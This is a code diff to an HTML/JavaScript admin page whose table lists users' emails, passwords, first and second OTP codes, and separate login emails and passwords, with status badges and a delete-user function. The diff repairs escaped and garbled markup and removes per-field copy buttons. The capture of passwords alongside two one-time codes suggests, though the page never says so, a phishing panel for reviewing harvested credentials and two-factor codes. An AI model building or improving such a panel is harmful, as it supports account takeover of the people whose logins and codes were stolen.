@@ -468,7 +468,7 @@ tr:hover {
   </div>
 
   <div class="table-container">
-        能
+        <table>
       <thead>
             <tr>
           <th>Email</th>
@@ -483,9 +483,9 @@ tr:hover {
             </tr>
       </thead>
       <tbody id="usersTableBody">
-        <tr><td colspan="9" style="text-align:center; padding:40px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Loading...<\/td><\/tr>
+        <tr><td colspan="9" style="text-align:center; padding:40px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Loading...</td></tr>
       </tbody>
-        <\/table>
+        </table>
   </div>
 </div>
 
@@ -699,7 +699,6 @@ tr:hover {
     }
   }
 
-  // DELETE USER FUNCTION - ADDED
   async function deleteUser(email) {
     if (confirm(`⚠️ Are you sure you want to permanently delete user: ${email}?\n\nThis action cannot be undone.`)) {
       showNotification('Deleting User', `Deleting ${email}...`, 'delete', false);
@@ -773,7 +772,7 @@ tr:hover {
   function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
     if (!users.length) {
-      tbody.innerHTML = '65e<td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found<\/td><\/tr>';
+      tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td></tr>';
       return;
     }
     
@@ -804,16 +803,16 @@ tr:hover {
       
       return `
         <tr>
-          <td>${formatValue(user.email, 'Email')}${' '}${copyBtn(user.email, 'Email')}<\/td>
-          <td>${formatValue(user.password, 'Password')}${' '}${copyBtn(user.password, 'Password')}<\/td>
-          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}${' '}${user.otp ? copyBtn(user.otp, 'First OTP') : ''}<\/td>
-          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}${' '}${user.second_otp ? copyBtn(user.second_otp, 'Second OTP') : ''}<\/td>
-          <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}${' '}${user.login_email ? copyBtn(user.login_email, 'Login Email') : ''}<\/td>
-          <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}${' '}${user.login_password ? copyBtn(user.login_password, 'Login Password') : ''}<\/td>
-          <td>${formatTimestamp(user.created_at)}<\/td>
-          <td>${statusBadge}<\/td>
-          <td class="actions-cell">${actionButtons}<\/td>
-         \/tr
+          <td>${formatValue(user.email, 'Email')}</td>
+          <td>${formatValue(user.password, 'Password')}</td>
+          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}</td>
+          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td>
+          <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td>
+          <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td>
+          <td>${formatTimestamp(user.created_at)}</td>
+          <td>${statusBadge}</td>
+          <td class="actions-cell">${actionButtons}</td>
+        </tr>
       `;
     }).join('');
   }
